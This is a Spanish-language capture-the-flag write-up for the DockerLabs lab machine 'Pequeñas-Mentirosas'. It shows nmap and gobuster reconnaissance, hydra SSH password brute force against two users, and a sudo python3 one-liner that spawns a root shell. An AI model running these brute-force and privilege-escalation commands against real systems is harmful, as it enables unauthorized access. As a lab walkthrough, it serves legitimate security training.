---
title: Pequeñas-Mentirosas - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | beafn28        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/c0f30b08-c06b-4fc6-a01e-613973085e60)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `22` (SSH)
- `80` (HTTP)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p 22,80,3000 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/1cb3e4d7-e634-4a95-9682-be2a7a03e5e4)

# Exploración Web
Observamos que en la pagina inicial muestra un mensaje `Pista: Encuentra la clave para A en los archivos.`.Como no vemos nada mas vamos a hacer fuzzing.

![image](https://github.com/user-attachments/assets/2a097f17-e4b9-4261-baca-5fa809b31e29)

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/87bc711b-a608-4d70-a491-16983d52e339)

No hemos encontrado nada a si que lo siguiente es hacer fuerza bruta al usuario `a`.

## Fuerza Bruta

Para ello usaremos `hydra`.

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Y parece que tenemos una contraseña , la contraseña es `secret`.

![image](https://github.com/user-attachments/assets/8cab8a67-e13c-4a25-90ae-af2d5e09bb12)

# Intrusion usuario a

Accedemos con el usuario `a` por `ssh`.

```bash
a@172.17.0.2
```

![image](https://github.com/user-attachments/assets/1641b4f0-7abf-4b8d-a71d-6596671d4221)

No encontramos mucha cosa pero si vemos que existe un usuario llamado spencer, por lo que le haremos fuerza bruta a ver si existe una contraseña

## Fuerza Bruta

Para ello usaremos `hydra`.

```bash
hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```

Y parece que tenemos una contraseña , la contraseña es `password1`.

![image](https://github.com/user-attachments/assets/da028713-4dc8-49df-b49d-0eeb1ad16c71)

# Intrusion usuario spencer

Accedemos con `spencer` por `ssh`.

![image](https://github.com/user-attachments/assets/bbdb8078-72be-4846-b33a-52610c7835d7)

Al ejecutar `sudo -l`, vemos que podemos ejecutar `python3` como `root` .Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/fa882495-bd9d-4456-88ca-323bbfa47825)

Ahora solo tenemos que generar una shell con permisos de root.

```bash
sudo /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
![image](https://github.com/user-attachments/assets/4b903770-949d-4d88-955c-dba80a0750c4)

Ya somos root.

